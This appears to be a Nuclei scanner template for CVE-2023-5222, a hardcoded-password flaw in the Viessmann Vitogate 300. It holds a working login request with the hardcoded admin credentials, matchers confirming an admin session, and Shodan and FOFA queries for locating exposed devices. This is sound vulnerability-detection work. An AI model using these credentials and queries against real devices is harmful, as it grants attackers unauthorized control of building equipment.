http:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - admin":true
    - '"sessionId":'
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - viessmann1917
    - viessmann
    username:
    - vitomaster
    - vitogate
  raw:
  - 'POST /cgi-bin/vitogate.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"method":"put","form":"form-login","params":{"uid":"{{username}}","pwd":"{{password}}"}}

    '
  stop-at-first-match: true
id: CVE-2023-5222
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:o:viessmann:vitogate_300_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-5222
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-259
    epss-percentile: 0.99538
    epss-score: 0.89713
  description: 'A critical vulnerability in Viessmann Vitogate 300 up to 2.1.3.0 allows
    attackers to authenticate using hardcoded credentials in the Web Management Interface.

    '
  impact: 'An attacker could potentially gain unauthorized access to the device.

    '
  metadata:
    fofa-query: title="Vitogate 300"
    max-request: 2
    product: vitogate_300_firmware
    shodan-query: title:"Vitogate 300"
    vendor: viessmann
    verified: true
  name: Viessmann Vitogate 300 - Hardcoded Password
  reference:
  - https://vuldb.com/?ctiid.240364
  - https://vuldb.com/?id.240364
  - https://nvd.nist.gov/vuln/detail/CVE-2023-5222
  remediation: 'Update the device firmware to remove the hardcoded password or change
    it to a strong, unique password.

    '
  severity: critical
  tags: cve,cve2023,viessmann,vitogate,default-login,vkev,vuln
